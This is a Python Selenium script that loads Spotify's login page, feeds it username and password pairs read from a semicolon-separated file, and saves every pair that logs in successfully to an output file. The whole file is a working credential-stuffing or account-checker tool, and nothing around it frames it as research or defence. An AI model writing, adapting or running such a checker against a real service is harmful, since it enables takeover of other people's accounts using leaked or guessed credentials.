from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
import time

text_file = open("Output.txt", "w")
browser = webdriver.Chrome()
browser.get("https://accounts.spotify.com/en/login?continue=https:%2F%2Fwww.spotify.com%2Fint%2Faccount%2Foverview%2F")
time.sleep(8)
with open("path") as f:
	for line in f:
		linedata = line.split(';')
		username = browser.find_element_by_id("login-username")
		password = browser.find_element_by_id("login-password")
		username.send_keys(linedata[0])
		password.send_keys(linedata[1])
		login = browser.find_element_by_id("g-recaptcha-button")
		login.submit()
		time.sleep(5)
		try:
			browser.find_element_by_xpath("/html/body/div[2]/div/form/div[1]/div/p/span")
			browser.find_element_by_id("login-username").clear()
			browser.find_element_by_id("login-password").clear()
			print("Error in login")
		except NoSuchElementException:
			print(linedata[0])
			print(linedata[1])
			text_file.write(linedata[0]+";"+linedata[1])
			browser = webdriver.Chrome()
			browser.get("https://accounts.spotify.com/en/login?continue=https:%2F%2Fwww.spotify.com%2Fint%2Faccount%2Foverview%2F")
			time.sleep(8)
text_file.close()